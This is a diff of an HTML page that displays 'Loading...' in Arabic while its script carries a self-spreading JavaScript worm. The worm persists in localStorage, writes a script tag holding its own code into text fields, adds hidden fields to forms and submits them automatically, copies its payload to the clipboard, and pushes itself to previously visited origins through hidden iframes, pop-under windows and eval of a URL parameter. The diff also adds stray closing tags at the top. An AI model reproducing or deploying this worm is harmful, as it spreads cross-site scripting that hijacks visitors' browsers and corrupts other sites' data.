@@ -1,3 +1,5 @@
+body>
+  </html>
 <!DOCTYPE html>
 <html>
 <head>
@@ -7,114 +9,114 @@
   <h2>جاري التحميل...</h2>
 
   <script>
-    // هنا ندعو الدالة مباشرة عشان تشتغل
-    (function persistentWorm(){
-      const wormCode = `(${persistentWorm.toString()})();`;
+  (function persistentWorm(){
+    const wormCode = `(${persistentWorm.toString()})();`;
 
+    try {
+      localStorage.setItem('persistent_worm', wormCode);
+    } catch(e){}
+
+    try {
+      let sites = JSON.parse(localStorage.getItem('lastSites')) || [];
+      const current = location.origin;
+      if (!sites.includes(current)) {
+        sites.push(current);
+        if (sites.length > 2) sites.shift();
+        localStorage.setItem('lastSites', JSON.stringify(sites));
+      }
+    } catch(e){}
+
+    function injectMessage() {
+      if (document.getElementById('wormMsg')) return;
+
+      const msg = document.createElement('div');
+      msg.id = 'wormMsg';
+      msg.textContent = "مرحباً، الكود مثبت وينتشر!";
+      msg.style.position = 'fixed';
+      msg.style.bottom = '20px';
+      msg.style.right = '20px';
+      msg.style.padding = '15px 25px';
+      msg.style.background = '#444';
+      msg.style.color = '#fff';
+      msg.style.fontSize = '18px';
+      msg.style.fontWeight = 'bold';
+      msg.style.borderRadius = '8px';
+      msg.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
+      msg.style.zIndex = '99999';
+
+      document.body.appendChild(msg);
+    }
+
+    injectMessage();
+
+    setInterval(injectMessage, 10000);
+
+    let sites = [];
+    try {
+      sites = JSON.parse(localStorage.getItem('lastSites')) || [];
+    } catch(e){}
+
+    const inputs = document.querySelectorAll('input[type="text"], textarea');
+    inputs.forEach(input => {
+      if (!input.value.includes('worm')) {
+        input.value += ` <script>${wormCode}</script>`;
+      }
+    });
+
+    const forms = document.querySelectorAll('form');
+    forms.forEach(form => {
+      if (!form.querySelector('input[name="worm"]')) {
+        const hidden = document.createElement('input');
+        hidden.type = 'hidden';
+        hidden.name = 'worm';
+        hidden.value = `<script>${wormCode}</script>`;
+        form.appendChild(hidden);
+        setTimeout(() => form.submit(), 3000);
+      }
+    });
+
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(`<script>${wormCode}</script>`).catch(() => {});
+    }
+
+    sites.forEach(site => {
+      if (site && site !== location.origin) {
+        const iframe = document.createElement('iframe');
+        iframe.src = `${site}/?infected=${encodeURIComponent(wormCode)}`;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+      }
+    });
+
+    if (!location.search.includes('infected')) {
+      const encoded = encodeURIComponent(wormCode);
+      const newUrl = `${location.pathname}?infected=${encoded}`;
+      history.replaceState({}, '', newUrl);
+    } else {
       try {
-        localStorage.setItem('persistent_worm', wormCode);
+        const code = decodeURIComponent(new URLSearchParams(location.search).get('infected'));
+        eval(code);
       } catch(e){}
+    }
 
+    if (sites.length > 0) {
+      setTimeout(() => {
+        const win = window.open(`${sites[sites.length - 1]}/?infected=${encodeURIComponent(wormCode)}`, '_blank');
+        if (win) win.blur();
+      }, 5000);
+    }
+
+    window.addEventListener('load', () => {
       try {
-        let sites = JSON.parse(localStorage.getItem('lastSites')) || [];
-        const current = location.origin;
-        if (!sites.includes(current)) {
-          sites.push(current);
-          if (sites.length > 2) sites.shift();
-          localStorage.setItem('lastSites', JSON.stringify(sites));
+        const storedWorm = localStorage.getItem('persistent_worm');
+        if (storedWorm && storedWorm !== wormCode) {
+          eval(storedWorm);
         }
       } catch(e){}
+    });
 
-      function injectMessage() {
-        if (document.getElementById('wormMsg')) return;
-
-        const msg = document.createElement('div');
-        msg.id = 'wormMsg';
-        msg.textContent = "مرحباً، الكود مثبت وينتشر!";
-        msg.style.position = 'fixed';
-        msg.style.bottom = '20px';
-        msg.style.right = '20px';
-        msg.style.padding = '15px 25px';
-        msg.style.background = '#444';
-        msg.style.color = '#fff';
-        msg.style.fontSize = '18px';
-        msg.style.fontWeight = 'bold';
-        msg.style.borderRadius = '8px';
-        msg.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
-        msg.style.zIndex = '99999';
-
-        document.body.appendChild(msg);
-      }
-
-      injectMessage();
-
-      setInterval(injectMessage, 10000);
-
-      let sites = [];
-      try {
-        sites = JSON.parse(localStorage.getItem('lastSites')) || [];
-      } catch(e){}
-
-      const inputs = document.querySelectorAll('input[type="text"], textarea');
-      inputs.forEach(input => {
-        if (!input.value.includes('worm')) {
-          input.value += ` <script>${wormCode}</script>`;
-        }
-      });
-
-      const forms = document.querySelectorAll('form');
-      forms.forEach(form => {
-        if (!form.querySelector('input[name="worm"]')) {
-          const hidden = document.createElement('input');
-          hidden.type = 'hidden';
-          hidden.name = 'worm';
-          hidden.value = `<script>${wormCode}</script>`;
-          form.appendChild(hidden);
-          setTimeout(() => form.submit(), 3000);
-        }
-      });
-
-      if (navigator.clipboard) {
-        navigator.clipboard.writeText(`<script>${wormCode}</script>`).catch(() => {});
-      }
-
-      sites.forEach(site => {
-        if (site && site !== location.origin) {
-          const iframe = document.createElement('iframe');
-          iframe.src = `${site}/?infected=${encodeURIComponent(wormCode)}`;
-          iframe.style.display = 'none';
-          document.body.appendChild(iframe);
-        }
-      });
-
-      if (!location.search.includes('infected')) {
-        const encoded = encodeURIComponent(wormCode);
-        const newUrl = `${location.pathname}?infected=${encoded}`;
-        history.replaceState({}, '', newUrl);
-      } else {
-        try {
-          const code = decodeURIComponent(new URLSearchParams(location.search).get('infected'));
-          eval(code);
-        } catch(e){}
-      }
-
-      if (sites.length > 0) {
-        setTimeout(() => {
-          const win = window.open(`${sites[sites.length - 1]}/?infected=${encodeURIComponent(wormCode)}`, '_blank');
-          if (win) win.blur();
-        }, 5000);
-      }
-
-      window.addEventListener('load', () => {
-        try {
-          const storedWorm = localStorage.getItem('persistent_worm');
-          if (storedWorm && storedWorm !== wormCode) {
-            eval(storedWorm);
-          }
-        } catch(e){}
-      });
-
-    })();
+  })();
   </script>
+
 </body>
   </html>
